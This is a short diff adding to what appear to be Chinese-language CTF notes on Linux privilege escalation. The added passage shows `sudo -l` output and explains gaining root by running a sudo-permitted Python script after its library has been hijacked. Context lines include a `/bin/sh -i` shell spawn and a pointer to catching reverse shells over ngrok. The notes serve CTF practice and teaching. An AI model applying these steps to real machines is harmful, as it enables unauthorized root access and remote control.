@@ -341,4 +341,18 @@ p=subprocess.call(["/bin/sh","-i"])
 
 变种方法：[Python Library Hijacking on Linux](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8)
 
+注意使用`sudo -l`找到无需密码就能使用root权限的命令后：
+
+```
+$ sudo -l
+Matching Defaults entries for xxx on challenge:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User xxx may run the following commands on challenge:
+    (ALL) /usr/bin/vi
+    (root) NOPASSWD: /usr/bin/python3 /home/xxx/.server.py
+```
+
+假设/home/xxx/.server.py的库已被劫持，要输入`sudo /usr/bin/python3 /home/xxx/.server.py`才能获取root权限。
+
 45. 使用ngrok转发tcp端口,实现反弹远程shell。[How to catch a Reverse shell over the Internet](https://systemweakness.com/how-to-catch-a-reverse-shell-over-the-internet-66d1be5f7bb9)
